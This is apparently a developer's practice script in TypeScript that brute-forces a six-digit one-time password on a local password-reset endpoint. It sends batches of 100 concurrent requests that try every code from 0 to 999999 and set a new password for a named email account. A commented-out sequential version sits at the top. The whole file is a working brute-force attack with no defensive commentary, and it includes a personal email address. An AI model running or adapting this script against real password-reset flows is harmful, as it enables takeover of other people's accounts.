// import axios from "axios";

// async function sendRequests() {
//   for (let i = 0; i <= 1000000; i++) {
//     const data = JSON.stringify({
//       email: "siddhantmunjamkar23@gmail.com",
//       otp: i,
//       newPassword: "kingsiddhant",
//     });

//     const config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "http://localhost:3000/reset-password",
//       headers: {
//         "Content-Type": "application/json",
//       },
//       data: data,
//     };

//     try {
//       const response = await axios.request(config);
//       console.log(`Response for OTP ${i}:`, response.data);
//       break;
//     } catch (error: any) {
//       console.error(`Error for OTP ${i}:`, error.message);
//     }
//   }
// }

// sendRequests();
import axios from "axios";

async function main(otp: string) {
  let data = JSON.stringify({
    email: "siddhantmunjamkar23@gmail.com",
    otp: otp,
    newPassword: "godsiddhant",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios
    .request(config)
    .then((response) => {
      console.log(` otp was this :${otp}` + JSON.stringify(response.data));
    })
    .catch((error) => {
      console.log(error);
    });
}

async function main2() {
  for (let i = 0; i <= 999999; i += 100) {
    const p = [];
    console.log(i);

    for (let j = 0; j < 100; j++) {
      p.push(main((i + j).toString()));
    }
    Promise.all(p);
  }
}

main2();
